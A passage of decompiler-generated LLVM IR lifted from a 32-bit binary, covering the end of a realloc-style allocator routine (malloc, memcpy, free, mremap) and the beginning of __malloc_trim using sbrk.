  store i32 %v2_8050ac0, i32* @ebx, align 4
  %v10_8050ac2 = icmp ult i32 %v2_8050ac0, %stack_var_-40.0
  br i1 %v10_8050ac2, label %dec_label_pc_8050ae8, label %dec_label_pc_8050ac8

dec_label_pc_8050ac8:                             ; preds = %dec_label_pc_8050ab9
  %v1_8050ac8 = add i32 %v1_8050a49, %tmp8
  %v2_8050ac8 = inttoptr i32 %v1_8050ac8 to i32*
  %v3_8050ac8 = load i32, i32* %v2_8050ac8, align 4
  store i32 %v3_8050ac8, i32* @edx, align 4
  %v1_8050acb = add i32 %v2_8050a67, 12
  %v2_8050acb = inttoptr i32 %v1_8050acb to i32*
  %v3_8050acb = load i32, i32* %v2_8050acb, align 4
  store i32 %v3_8050acb, i32* %eax.global-to-local, align 4
  %v1_8050ace = add i32 %v3_8050ac8, 12
  %v2_8050ace = inttoptr i32 %v1_8050ace to i32*
  %v3_8050ace = load i32, i32* %v2_8050ace, align 4
  %v15_8050ace = icmp eq i32 %v3_8050ace, %v2_8050a67
  %v1_8050ad1 = icmp eq i1 %v15_8050ace, false
  br i1 %v1_8050ad1, label %dec_label_pc_8050ad8, label %dec_label_pc_8050ad3

dec_label_pc_8050ad3:                             ; preds = %dec_label_pc_8050ac8
  %v1_8050ad3 = add i32 %v3_8050acb, 8
  %v2_8050ad3 = inttoptr i32 %v1_8050ad3 to i32*
  %v3_8050ad3 = load i32, i32* %v2_8050ad3, align 4
  %v15_8050ad3 = icmp eq i32 %v3_8050ad3, %v2_8050a67
  br i1 %v15_8050ad3, label %dec_label_pc_8050add, label %dec_label_pc_8050ad8

dec_label_pc_8050ad8:                             ; preds = %dec_label_pc_8050ad3, %dec_label_pc_8050ac8
  %v0_8050ad8 = call i32 @abort()
  store i32 %v0_8050ad8, i32* %eax.global-to-local, align 4
  %v1_8050add.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050add

dec_label_pc_8050add:                             ; preds = %dec_label_pc_8050ad3, %dec_label_pc_8050ad8
  %v1_8050add = phi i32 [ %v3_8050ac8, %dec_label_pc_8050ad3 ], [ %v1_8050add.pre, %dec_label_pc_8050ad8 ]
  %v0_8050add = phi i32 [ %v3_8050acb, %dec_label_pc_8050ad3 ], [ %v0_8050ad8, %dec_label_pc_8050ad8 ]
  %v2_8050add = add i32 %v1_8050add, 12
  %v3_8050add = inttoptr i32 %v2_8050add to i32*
  store i32 %v0_8050add, i32* %v3_8050add, align 4
  %v0_8050ae0 = load i32, i32* @edx, align 4
  %v1_8050ae0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ae0 = add i32 %v1_8050ae0, 8
  %v3_8050ae0 = inttoptr i32 %v2_8050ae0 to i32*
  store i32 %v0_8050ae0, i32* %v3_8050ae0, align 4
  %v0_8050b98.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050b98

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050ab9, %dec_label_pc_8050aaa, %dec_label_pc_8050a72
  %v1_8050aef = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050aef, i32* %eax.global-to-local, align 4
  store i32 %v1_8050aef, i32* %stack_var_-60, align 4
  %v1_8050af3 = call i32 @malloc(i32 %v1_8050aef)
  store i32 %v1_8050af3, i32* %eax.global-to-local, align 4
  %v1_8050afb = icmp eq i32 %v1_8050af3, 0
  store i32 %v1_8050af3, i32* @edx, align 4
  br i1 %v1_8050afb, label %dec_label_pc_8050cc7, label %dec_label_pc_8050b05

dec_label_pc_8050b05:                             ; preds = %dec_label_pc_8050ae8
  %v1_8050b05 = add i32 %v1_8050af3, -8
  store i32 %v1_8050b05, i32* %ebx.global-to-local, align 4
  %v1_8050b08 = load i32, i32* @esi, align 4
  %v12_8050b08 = icmp eq i32 %v1_8050b05, %v1_8050b08
  %v1_8050b0a = add i32 %v1_8050af3, -4
  %v2_8050b0a = inttoptr i32 %v1_8050b0a to i32*
  %v3_8050b0a = load i32, i32* %v2_8050b0a, align 4
  store i32 %v3_8050b0a, i32* %eax.global-to-local, align 4
  %v1_8050b0d = icmp eq i1 %v12_8050b08, false
  br i1 %v1_8050b0d, label %dec_label_pc_8050b1b, label %dec_label_pc_8050b0f

dec_label_pc_8050b0f:                             ; preds = %dec_label_pc_8050b05
  store i32 %v1_8050a49, i32* @edx, align 4
  %v1_8050b13 = and i32 %v3_8050b0a, -4
  store i32 %v1_8050b13, i32* %eax.global-to-local, align 4
  %v2_8050b16 = add i32 %v1_8050b13, %v1_8050a49
  store i32 %v2_8050b16, i32* @ebx, align 4
  br label %dec_label_pc_8050b98

dec_label_pc_8050b1b:                             ; preds = %dec_label_pc_8050b05
  %v1_8050b1f = add i32 %v1_8050a49, -4
  store i32 %v1_8050b1f, i32* %eax.global-to-local, align 4
  %v2_8050b24 = udiv i32 %v1_8050b1f, 4
  store i32 %v2_8050b24, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_8050b1f, 37
  br i1 %tmp23, label %dec_label_pc_8050b3d, label %dec_label_pc_8050b2c

dec_label_pc_8050b2c:                             ; preds = %dec_label_pc_8050b1b
  store i32 %v1_8050af3, i32* %stack_var_-60, align 4
  %v3_8050b33 = inttoptr i32 %v1_8050af3 to i16*
  %v4_8050b33 = call i32 @memcpy(i16* %v3_8050b33, i32 %tmp8, i32 %v1_8050b1f)
  store i32 %v4_8050b33, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b84

dec_label_pc_8050b3d:                             ; preds = %dec_label_pc_8050b1b
  store i32 %tmp8, i32* @esi, align 4
  %v2_8050b44 = load i32, i32* %arg1, align 4
  store i32 %v2_8050b44, i32* %eax.global-to-local, align 4
  %v2_8050b46 = inttoptr i32 %v1_8050af3 to i32*
  store i32 %v2_8050b44, i32* %v2_8050b46, align 4
  %v0_8050b48 = load i32, i32* @esi, align 4
  %v1_8050b48 = add i32 %v0_8050b48, 4
  %v2_8050b48 = inttoptr i32 %v1_8050b48 to i32*
  %v3_8050b48 = load i32, i32* %v2_8050b48, align 4
  store i32 %v3_8050b48, i32* %eax.global-to-local, align 4
  %v1_8050b4b = load i32, i32* @edx, align 4
  %v2_8050b4b = add i32 %v1_8050b4b, 4
  %v3_8050b4b = inttoptr i32 %v2_8050b4b to i32*
  store i32 %v3_8050b48, i32* %v3_8050b4b, align 4
  %v0_8050b4e = load i32, i32* @esi, align 4
  %v1_8050b4e = add i32 %v0_8050b4e, 8
  %v2_8050b4e = inttoptr i32 %v1_8050b4e to i32*
  %v3_8050b4e = load i32, i32* %v2_8050b4e, align 4
  store i32 %v3_8050b4e, i32* %eax.global-to-local, align 4
  %v1_8050b51 = load i32, i32* @edx, align 4
  %v2_8050b51 = add i32 %v1_8050b51, 8
  %v3_8050b51 = inttoptr i32 %v2_8050b51 to i32*
  store i32 %v3_8050b4e, i32* %v3_8050b51, align 4
  %tmp24 = icmp ult i32 %v1_8050b1f, 17
  br i1 %tmp24, label %dec_label_pc_8050b84, label %dec_label_pc_8050b56

dec_label_pc_8050b56:                             ; preds = %dec_label_pc_8050b3d
  %v0_8050b56 = load i32, i32* @esi, align 4
  %v1_8050b56 = add i32 %v0_8050b56, 12
  %v2_8050b56 = inttoptr i32 %v1_8050b56 to i32*
  %v3_8050b56 = load i32, i32* %v2_8050b56, align 4
  store i32 %v3_8050b56, i32* %eax.global-to-local, align 4
  %v0_8050b59 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b5c = load i32, i32* @edx, align 4
  %v2_8050b5c = add i32 %v1_8050b5c, 12
  %v3_8050b5c = inttoptr i32 %v2_8050b5c to i32*
  store i32 %v3_8050b56, i32* %v3_8050b5c, align 4
  %v0_8050b5f = load i32, i32* @esi, align 4
  %v1_8050b5f = add i32 %v0_8050b5f, 16
  %v2_8050b5f = inttoptr i32 %v1_8050b5f to i32*
  %v3_8050b5f = load i32, i32* %v2_8050b5f, align 4
  store i32 %v3_8050b5f, i32* %eax.global-to-local, align 4
  %v1_8050b62 = load i32, i32* @edx, align 4
  %v2_8050b62 = add i32 %v1_8050b62, 16
  %v3_8050b62 = inttoptr i32 %v2_8050b62 to i32*
  store i32 %v3_8050b5f, i32* %v3_8050b62, align 4
  %tmp25 = icmp ult i32 %v0_8050b59, 7
  br i1 %tmp25, label %dec_label_pc_8050b84, label %dec_label_pc_8050b67

dec_label_pc_8050b67:                             ; preds = %dec_label_pc_8050b56
  %v0_8050b67 = load i32, i32* @esi, align 4
  %v1_8050b67 = add i32 %v0_8050b67, 20
  %v2_8050b67 = inttoptr i32 %v1_8050b67 to i32*
  %v3_8050b67 = load i32, i32* %v2_8050b67, align 4
  store i32 %v3_8050b67, i32* %eax.global-to-local, align 4
  %v0_8050b6a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b6d = load i32, i32* @edx, align 4
  %v2_8050b6d = add i32 %v1_8050b6d, 20
  %v3_8050b6d = inttoptr i32 %v2_8050b6d to i32*
  store i32 %v3_8050b67, i32* %v3_8050b6d, align 4
  %v0_8050b70 = load i32, i32* @esi, align 4
  %v1_8050b70 = add i32 %v0_8050b70, 24
  %v2_8050b70 = inttoptr i32 %v1_8050b70 to i32*
  %v3_8050b70 = load i32, i32* %v2_8050b70, align 4
  store i32 %v3_8050b70, i32* %eax.global-to-local, align 4
  %v1_8050b73 = load i32, i32* @edx, align 4
  %v2_8050b73 = add i32 %v1_8050b73, 24
  %v3_8050b73 = inttoptr i32 %v2_8050b73 to i32*
  store i32 %v3_8050b70, i32* %v3_8050b73, align 4
  %tmp26 = icmp ult i32 %v0_8050b6a, 9
  br i1 %tmp26, label %dec_label_pc_8050b84, label %dec_label_pc_8050b78

dec_label_pc_8050b78:                             ; preds = %dec_label_pc_8050b67
  %v0_8050b78 = load i32, i32* @esi, align 4
  %v1_8050b78 = add i32 %v0_8050b78, 28
  %v2_8050b78 = inttoptr i32 %v1_8050b78 to i32*
  %v3_8050b78 = load i32, i32* %v2_8050b78, align 4
  store i32 %v3_8050b78, i32* %eax.global-to-local, align 4
  %v1_8050b7b = load i32, i32* @edx, align 4
  %v2_8050b7b = add i32 %v1_8050b7b, 28
  %v3_8050b7b = inttoptr i32 %v2_8050b7b to i32*
  store i32 %v3_8050b78, i32* %v3_8050b7b, align 4
  %v0_8050b7e = load i32, i32* @esi, align 4
  %v1_8050b7e = add i32 %v0_8050b7e, 32
  %v2_8050b7e = inttoptr i32 %v1_8050b7e to i32*
  %v3_8050b7e = load i32, i32* %v2_8050b7e, align 4
  store i32 %v3_8050b7e, i32* %eax.global-to-local, align 4
  %v1_8050b81 = load i32, i32* @edx, align 4
  %v2_8050b81 = add i32 %v1_8050b81, 32
  %v3_8050b81 = inttoptr i32 %v2_8050b81 to i32*
  store i32 %v3_8050b7e, i32* %v3_8050b81, align 4
  br label %dec_label_pc_8050b84

dec_label_pc_8050b84:                             ; preds = %dec_label_pc_8050b67, %dec_label_pc_8050b56, %dec_label_pc_8050b3d, %dec_label_pc_8050b2c, %dec_label_pc_8050b78
  %v0_8050b87 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050b87 = add i32 %v0_8050b87, 8
  store i32 %v1_8050b87, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050b8e = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050cc2

dec_label_pc_8050b98:                             ; preds = %dec_label_pc_8050a59, %dec_label_pc_8050b0f, %dec_label_pc_8050add
  %v1_8050ba9 = phi i32 [ %v1_8050a49, %dec_label_pc_8050a59 ], [ %v2_8050b16, %dec_label_pc_8050b0f ], [ %v0_8050b98.pre, %dec_label_pc_8050add ]
  %v5_8050b9a = sub i32 %v1_8050ba9, %stack_var_-40.0
  store i32 %v5_8050b9a, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_8050b9a, 16
  br i1 %tmp27, label %dec_label_pc_8050ba3, label %dec_label_pc_8050bb5

dec_label_pc_8050ba3:                             ; preds = %dec_label_pc_8050b98
  %v0_8050ba3 = load i32, i32* @edi, align 4
  %v1_8050ba3 = add i32 %v0_8050ba3, 4
  %v2_8050ba3 = inttoptr i32 %v1_8050ba3 to i32*
  %v3_8050ba3 = load i32, i32* %v2_8050ba3, align 4
  %v1_8050ba6 = urem i32 %v3_8050ba3, 2
  %v2_8050ba9 = or i32 %v1_8050ba6, %v1_8050ba9
  store i32 %v2_8050ba9, i32* %eax.global-to-local, align 4
  store i32 %v2_8050ba9, i32* %v2_8050ba3, align 4
  %v0_8050bae = load i32, i32* @edi, align 4
  %v1_8050bae = load i32, i32* @ebx, align 4
  %v2_8050bae = add i32 %v0_8050bae, 4
  %v3_8050bae = add i32 %v2_8050bae, %v1_8050bae
  %v4_8050bae = inttoptr i32 %v3_8050bae to i32*
  %v5_8050bae = load i32, i32* %v4_8050bae, align 4
  %v6_8050bae = or i32 %v5_8050bae, 1
  store i32 %v6_8050bae, i32* %v4_8050bae, align 4
  br label %dec_label_pc_8050be5

dec_label_pc_8050bb5:                             ; preds = %dec_label_pc_8050b98
  %v0_8050bb9 = load i32, i32* @edi, align 4
  %v2_8050bb9 = add i32 %v0_8050bb9, %stack_var_-40.0
  store i32 %v2_8050bb9, i32* %eax.global-to-local, align 4
  %v1_8050bbc = add i32 %v0_8050bb9, 4
  %v2_8050bbc = inttoptr i32 %v1_8050bbc to i32*
  %v3_8050bbc = load i32, i32* %v2_8050bbc, align 4
  %v1_8050bbf = urem i32 %v3_8050bbc, 2
  %v5_8050bc2 = or i32 %v1_8050bbf, %stack_var_-40.0
  store i32 %v5_8050bc2, i32* %v2_8050bbc, align 4
  %v0_8050bcc = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050bce = or i32 %v0_8050bcc, 1
  store i32 %v1_8050bce, i32* @edx, align 4
  %v1_8050bd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050bd1 = add i32 %v1_8050bd1, 4
  %v3_8050bd1 = inttoptr i32 %v2_8050bd1 to i32*
  store i32 %v1_8050bce, i32* %v3_8050bd1, align 4
  %v0_8050bd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bd4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050bd4 = add i32 %v0_8050bd4, 4
  %v3_8050bd4 = add i32 %v2_8050bd4, %v1_8050bd4
  %v4_8050bd4 = inttoptr i32 %v3_8050bd4 to i32*
  %v5_8050bd4 = load i32, i32* %v4_8050bd4, align 4
  %v6_8050bd4 = or i32 %v5_8050bd4, 1
  store i32 %v6_8050bd4, i32* %v4_8050bd4, align 4
  %v0_8050bd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bd9 = add i32 %v0_8050bd9, 8
  store i32 %v1_8050bd9, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bd9, i32* %stack_var_-60, align 4
  %v1_8050bdd = call i32 @free(i32 %v1_8050bd9)
  store i32 %v1_8050bdd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050be5

dec_label_pc_8050be5:                             ; preds = %dec_label_pc_8050ba3, %dec_label_pc_8050bb5
  %v0_8050be5 = load i32, i32* @edi, align 4
  %v1_8050be5 = add i32 %v0_8050be5, 8
  store i32 %v1_8050be5, i32* @ebx, align 4
  br label %dec_label_pc_8050ccf

dec_label_pc_8050bed:                             ; preds = %dec_label_pc_8050a3d
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_8050bf1 = load i32, i32* @global_var_8060d5c.194, align 4
  store i32 %v0_8050bf1, i32* %eax.global-to-local, align 4
  %v2_8050bfa = inttoptr i32 %v1_8050a41 to i32*
  %v3_8050bfa = load i32, i32* %v2_8050bfa, align 4
  store i32 %v3_8050bfa, i32* @ebp, align 4
  %v1_8050bfd = add i32 %v0_8050bf1, -1
  %v1_8050bfe = or i32 %stack_var_-40.0, 4
  store i32 %v1_8050bfe, i32* %stack_var_-44, align 4
  %v2_8050c04 = add i32 %v1_8050bfd, %v3_8050bfa
  store i32 %v2_8050c04, i32* @edx, align 4
  %v1_8050c07 = sub i32 0, %v0_8050bf1
  store i32 %v1_8050c07, i32* %eax.global-to-local, align 4
  %v2_8050c09 = add i32 %v2_8050c04, %v1_8050bfe
  %v2_8050c0c = and i32 %v2_8050c09, %v1_8050c07
  store i32 %v2_8050c0c, i32* @esi, align 4
  %v2_8050c10 = sub i32 %v2_8050c0c, %v3_8050bfa
  store i32 %v2_8050c10, i32* @ebx, align 4
  %v15_8050c12 = icmp eq i32 %v1_8050a49, %v2_8050c10
  br i1 %v15_8050c12, label %dec_label_pc_8050ccb, label %dec_label_pc_8050c1c

dec_label_pc_8050c1c:                             ; preds = %dec_label_pc_8050bed
  %v2_8050c1e = sub i32 %v1_8050a41, %v3_8050bfa
  store i32 %v2_8050c1e, i32* @edi, align 4
  %v2_8050c25 = add i32 %v3_8050bfa, %v1_8050a49
  store i32 %v2_8050c25, i32* %eax.global-to-local, align 4
  store i32 %v2_8050c1e, i32* %stack_var_-60, align 4
  %v6_8050c29 = call i32 @mremap(i32 %v2_8050c1e, i32 %v2_8050c25, i32 %v2_8050c0c, i32 1, i32 %v1_8050bfe, i32 %v1_8050a49)
  store i32 %v6_8050c29, i32* %eax.global-to-local, align 4
  %v10_8050c31 = icmp eq i32 %v6_8050c29, -1
  br i1 %v10_8050c31, label %dec_label_pc_8050c83, label %dec_label_pc_8050c36

dec_label_pc_8050c36:                             ; preds = %dec_label_pc_8050c1c
  %v1_8050c36 = load i32, i32* @ebp, align 4
  %v2_8050c36 = add i32 %v1_8050c36, %v6_8050c29
  store i32 %v2_8050c36, i32* %eax.global-to-local, align 4
  %v0_8050c38 = load i32, i32* @ebx, align 4
  %v1_8050c38 = or i32 %v0_8050c38, 2
  %v2_8050c3b = add i32 %v2_8050c36, 4
  %v3_8050c3b = inttoptr i32 %v2_8050c3b to i32*
  store i32 %v1_8050c38, i32* %v3_8050c3b, align 4
  %v0_8050c3e = load i32, i32* @esi, align 4
  %v5_8050c40 = sub i32 %v0_8050c3e, %v1_8050a49
  %v0_8050c44 = load i32, i32* @global_var_8060d70.198, align 16
  %v0_8050c4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c4a = add i32 %v0_8050c4a, 8
  store i32 %v1_8050c4a, i32* @ebx, align 4
  %v1_8050c4d = load i32, i32* @global_var_8060d64.200, align 4
  %v2_8050c4d = add i32 %v1_8050c4d, %v5_8050c40
  store i32 %v2_8050c4d, i32* @global_var_8060d64.200, align 4
  %tmp20 = icmp ule i32 %v2_8050c4d, %v0_8050c44
  %v5_8050c5f = select i1 %tmp20, i32 %v0_8050c44, i32 %v2_8050c4d
  store i32 %v5_8050c5f, i32* %ecx.global-to-local, align 4
  %v1_8050c62 = load i32, i32* @global_var_8060d68.201, align 8
  %v2_8050c62 = add i32 %v1_8050c62, %v2_8050c4d
  store i32 %v5_8050c5f, i32* @global_var_8060d70.198, align 16
  %v1_8050c6e = load i32, i32* @global_var_8060d74.202, align 4
  %tmp28 = icmp ule i32 %v2_8050c62, %v1_8050c6e
  %v5_8050c74 = select i1 %tmp28, i32 %v1_8050c6e, i32 %v2_8050c62
  store i32 %v5_8050c74, i32* @edx, align 4
  store i32 %v5_8050c74, i32* @global_var_8060d74.202, align 4
  br label %dec_label_pc_8050ccf

dec_label_pc_8050c83:                             ; preds = %dec_label_pc_8050c1c
  %v2_8050c83 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050c83, i32* %eax.global-to-local, align 4
  %v10_8050c86 = icmp ult i32 %v1_8050a49, %v2_8050c83
  %v1_8050c8a = icmp eq i1 %v10_8050c86, false
  br i1 %v1_8050c8a, label %dec_label_pc_8050ccb, label %dec_label_pc_8050c8c

dec_label_pc_8050c8c:                             ; preds = %dec_label_pc_8050c83
  %v1_8050c93 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050c93, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c93, i32* %stack_var_-60, align 4
  %v1_8050c97 = call i32 @malloc(i32 %v1_8050c93)
  store i32 %v1_8050c97, i32* %eax.global-to-local, align 4
  %v1_8050c9f = icmp eq i32 %v1_8050c97, 0
  store i32 %v1_8050c97, i32* @ebx, align 4
  br i1 %v1_8050c9f, label %dec_label_pc_8050cc7, label %dec_label_pc_8050ca5

dec_label_pc_8050ca5:                             ; preds = %dec_label_pc_8050c8c
  %v1_8050caa = add i32 %v1_8050a49, -8
  store i32 %v1_8050caa, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c97, i32* %stack_var_-60, align 4
  %v3_8050cb3 = inttoptr i32 %v1_8050c97 to i16*
  %v4_8050cb3 = call i32 @memcpy(i16* %v3_8050cb3, i32 %tmp8, i32 %v1_8050caa)
  store i32 %v4_8050cb3, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c97, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050cbd = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050cc2

dec_label_pc_8050cc2:                             ; preds = %dec_label_pc_8050b84, %dec_label_pc_8050ca5
  %storemerge = phi i32 [ %v1_8050cbd, %dec_label_pc_8050ca5 ], [ %v1_8050b8e, %dec_label_pc_8050b84 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ccf

dec_label_pc_8050cc7:                             ; preds = %dec_label_pc_8050c8c, %dec_label_pc_8050ae8
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050ccf

dec_label_pc_8050ccb:                             ; preds = %dec_label_pc_8050c83, %dec_label_pc_8050bed, %dec_label_pc_8050a87
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8050ccf

dec_label_pc_8050ccf:                             ; preds = %dec_label_pc_8050cc7, %dec_label_pc_8050cc2, %dec_label_pc_8050c36, %dec_label_pc_8050be5, %dec_label_pc_8050ccb
  store i32 %v2_80509f6, i32* @eax, align 4
  store i32 %v2_80509f6, i32* %stack_var_-60, align 4
  %v2_8050cd8 = call i32 @__pthread_return_void(i32 %v2_80509f6, i32 1)
  store i32 %v2_8050cd8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cdd

dec_label_pc_8050cdd:                             ; preds = %dec_label_pc_80509da, %dec_label_pc_80509c6, %dec_label_pc_8050ccf
  br label %dec_label_pc_8050ce0

dec_label_pc_8050ce0:                             ; preds = %dec_label_pc_8050a14, %dec_label_pc_8050cdd
  %v0_8050ce3 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ce3, i32* %eax.global-to-local, align 4
  store i32 %v0_80509b7, i32* %ebx.global-to-local, align 4
  store i32 %v0_80509b6, i32* @esi, align 4
  ret i32 %v0_8050ce3

; uselistorder directives
  uselistorder i32 %v1_8050c97, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8050c6e, { 1, 0 }
  uselistorder i32 %v2_8050c62, { 1, 0 }
  uselistorder i32 %v2_8050c4d, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8050c44, { 1, 0 }
  uselistorder i32 %v6_8050c29, { 1, 0, 2 }
  uselistorder i32 %v2_8050c1e, { 1, 0, 2 }
  uselistorder i32 %v1_8050bfe, { 2, 0, 1 }
  uselistorder i32 %v3_8050bfa, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050bb9, { 1, 0 }
  uselistorder i32 %v1_8050b1f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050af3, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_8050a97, { 1, 0, 2 }
  uselistorder i32 %v3_8050aaa, { 0, 2, 1 }
  uselistorder i32 %v2_8050a67, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050a49, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8050a41, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8050a36, { 1, 0 }
  uselistorder i32 %v1_8050a26, { 1, 2, 0 }
  uselistorder i32 %v0_8050a0f, { 1, 0 }
  uselistorder i32 %v2_80509f6, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ce0, { 1, 0 }
  uselistorder label %dec_label_pc_8050cdd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050ccf, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050cc2, { 1, 0 }
  uselistorder label %dec_label_pc_8050be5, { 1, 0 }
  uselistorder label %dec_label_pc_8050b98, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050b84, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050add, { 1, 0 }
  uselistorder label %dec_label_pc_8050a3d, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8050ced = load i32, i32* @edx, align 4
  store i32 %v0_8050ced, i32* %ebp.global-to-local, align 4
  %v0_8050cf0 = load i32, i32* @esi, align 4
  %v1_8050cf5 = add i32 %v0_8050ced, 860
  %v2_8050cf5 = inttoptr i32 %v1_8050cf5 to i32*
  %v3_8050cf5 = load i32, i32* %v2_8050cf5, align 4
  store i32 %v3_8050cf5, i32* @ecx, align 4
  %v1_8050cfb = add i32 %v0_8050ced, 44
  %v2_8050cfb = inttoptr i32 %v1_8050cfb to i32*
  %v3_8050cfb = load i32, i32* %v2_8050cfb, align 4
  %v1_8050cfe = add i32 %v3_8050cfb, 4
  %v2_8050cfe = inttoptr i32 %v1_8050cfe to i32*
  %v3_8050cfe = load i32, i32* %v2_8050cfe, align 4
  %v1_8050d01 = and i32 %v3_8050cfe, -4
  store i32 %v1_8050d01, i32* @esi, align 4
  %v1_8050d06 = load i32, i32* @eax, align 4
  %v2_8050d06 = add i32 %v3_8050cf5, -17
  %v2_8050d08 = add i32 %v2_8050d06, %v1_8050d01
  %v3_8050d08 = sub i32 %v2_8050d08, %v1_8050d06
  %div = udiv i32 %v3_8050d08, %v3_8050cf5
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050d08, %v3_8050cf5
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050d10 = add i32 %div, -1
  %v4_8050d13 = mul i32 %v1_8050d10, %v3_8050cf5
  store i32 %v4_8050d13, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050d13, 1
  br i1 %tmp11, label %dec_label_pc_8050d6f, label %dec_label_pc_8050d1a

dec_label_pc_8050d1a:                             ; preds = %entry
  %v1_8050d1f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050d1f, i32* %edi.global-to-local, align 4
  %v0_8050d29 = load i32, i32* @esi, align 4
  store i32 %v0_8050d29, i32* %eax.global-to-local, align 4
  %v1_8050d2b = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050d2b = add i32 %v1_8050d2b, 44
  %v3_8050d2b = inttoptr i32 %v2_8050d2b to i32*
  %v4_8050d2b = load i32, i32* %v3_8050d2b, align 4
  %v5_8050d2b = add i32 %v4_8050d2b, %v0_8050d29
  store i32 %v5_8050d2b, i32* %eax.global-to-local, align 4
  %v12_8050d2e = icmp eq i32 %v1_8050d1f, %v5_8050d2b
  %v1_8050d30 = icmp eq i1 %v12_8050d2e, false
  br i1 %v1_8050d30, label %dec_label_pc_8050d6f, label %dec_label_pc_8050d32

dec_label_pc_8050d32:                             ; preds = %dec_label_pc_8050d1a
  %v1_8050d35 = sub i32 0, %v4_8050d13
  store i32 %v1_8050d35, i32* @ebx, align 4
  %v1_8050d38 = call i32 @__GI_sbrk(i32 %v1_8050d35)
  store i32 %v1_8050d38, i32* %eax.global-to-local, align 4
  %v1_8050d44 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050d44, i32* %eax.global-to-local, align 4
  %v10_8050d4c = icmp eq i32 %v1_8050d44, -1
  br i1 %v10_8050d4c, label %dec_label_pc_8050d6f, label %dec_label_pc_8050d51

dec_label_pc_8050d51:                             ; preds = %dec_label_pc_8050d32
  %v0_8050d51 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050d53 = sub i32 %v0_8050d51, %v1_8050d44
  %v12_8050d53 = icmp eq i32 %v2_8050d53, 0
  store i32 %v2_8050d53, i32* @ecx, align 4
  br i1 %v12_8050d53, label %dec_label_pc_8050d6f, label %dec_label_pc_8050d57

dec_label_pc_8050d57:                             ; preds = %dec_label_pc_8050d51
  %v0_8050d57 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050d57 = add i32 %v0_8050d57, 44
  %v2_8050d57 = inttoptr i32 %v1_8050d57 to i32*
  %v3_8050d57 = load i32, i32* %v2_8050d57, align 4
  store i32 %v3_8050d57, i32* %eax.global-to-local, align 4
  %v0_8050d5a = load i32, i32* @esi, align 4
  %v2_8050d5a = sub i32 %v0_8050d5a, %v2_8050d53
  store i32 %v2_8050d5a, i32* %esi.global-to-local, align 4
